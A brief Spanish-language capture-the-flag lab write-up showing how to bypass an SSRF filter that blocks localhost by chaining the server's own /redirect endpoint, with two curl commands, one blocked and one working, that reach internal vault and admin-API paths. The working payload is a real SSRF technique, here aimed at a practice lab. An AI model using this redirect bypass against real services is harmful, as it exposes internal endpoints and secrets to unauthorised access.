# Lab ssrf-deep

Room: **ssrf-basico** (task adicional). SSRF avanzado: redirect bypass.

## El reto
El fetcher BLOQUEA localhost/127.0.0.1 directamente. Pero hay un endpoint
`/redirect?url=X` que hace un 302...

## Bypass
```bash
# Directo (bloqueado):
curl "http://127.0.0.1:18095/fetch?url=http://localhost:8080/internal/vault"
# → Blocked

# Via redirect (funciona):
curl "http://127.0.0.1:18095/fetch?url=http://127.0.0.1:18095/redirect%3Furl%3Dhttp://localhost:8080/internal/vault"
# El fetcher sigue el redirect → llega a localhost → devuelve la flag
```

## Flags
- FLAG_1 — en /internal/vault (redirect bypass)
- FLAG_2 — en /internal/admin-api (same technique)
